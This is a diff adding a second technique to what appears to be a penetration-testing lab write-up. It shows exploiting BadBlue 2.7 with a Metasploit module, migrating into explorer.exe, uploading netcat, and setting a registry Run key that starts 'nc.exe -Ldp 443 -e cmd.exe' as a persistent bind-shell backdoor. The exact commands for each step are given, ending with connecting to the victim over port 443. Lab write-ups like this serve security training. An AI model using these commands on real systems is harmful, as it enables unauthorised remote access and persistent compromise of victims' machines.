@@ -62,6 +62,63 @@ if compromised system reboot or shutdown because i have created a backdoor which
 
 ===============================================complete============================================
 
+Technique 2: Modifying in registry key "Run" by adding netcat utility.
+
+Procedure:
+
+In this lab, firstly we will perform fingerprint the target with the help of NMAP tool (nmap target_ip). In the output of nmap
+we have observed that port 80 is open but to know the version of service we will again run nmap (nmap -sV -p 80 target_IP).
+From output of nmap we come to know that badblue 2.7 is running on target machine on port 80. Now 1st phase is completed.
+
+Now we will search exploit for badblue 2.7 so we will use CLI command searchsploit (searchsploit badblue 2.7) to find out
+the exploit. Also we can use Exploitdb site to find out the exploit. After running searchsploit command, we have found one
+exploit for metasploit "exploit/windows/http/badblue_passthru". Now we will load this exploit in metasploit framework and set required 
+parameters by set RHOSTS.
+use exploit/windows/http/badblue_passthru
+set RHOSTS target_ip
+exploit
+
+We have successfully exploited the target vulnerable application i.e badblue and recieved a meterpreter shell. Now 2nd phase
+completed.
+
+After exploitation, firstly we check the user(getuid) and found that we are running as administrator user. Now we are migrating 
+our temporary process to permanent process.For this first we check the pid of explorer.exe (ps -S explorer.exe) and once found
+the PID, migrate (migrate PID of Explorer.exe) to explorer.exe. Now 3rd completed.
+
+Now we are going to maintain access or Persistence using Netcat utility. We will upload nc.exe on the target machine and modify
+the registry to have Netcat execute on startup and listen on port 443.
+
+Upload Netcat i.e nc.exe (In meterpreter shell we will use this command: upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32)
+From above command, we have uploaded nc.exe in the "C:\windows\system32" directory.
+
+Now modifying the registry to start netcat on startup.Below is the command which we use to modify registry by adding nc.exe:
+
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
+
+Now we have modify the registry.For verifying added value we will use below command:
+
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+
+We have successfully configured the Netcat persistence backdoor.
+
+Now if compromised system rebooted still we are able to connect the victim because we have added netcat utility which listen on port 443
+in the startup registry.
+In my lab scenerio, i am going to reboot the target system and once system start our netcat utility execute process start on port 443. To confirm 
+this i will run namp from my attacker machine and in output i have observed now port 443 is exposed which was not exposed in the 1st phase.
+
+Everything is set, now i am going to connect target on port 443 using netcat from attacker machine:
+
+nc -v taget_ip 443
+
+Now i have connected with victim's system. This is the 2nd way how we can create Persistence from netcat utility. Now whenever i want
+to connect with compromised system, i will connect with netcat utility on port 443.
+
+========================================================Completed===============================
+
+
+
+
+
 
 
 
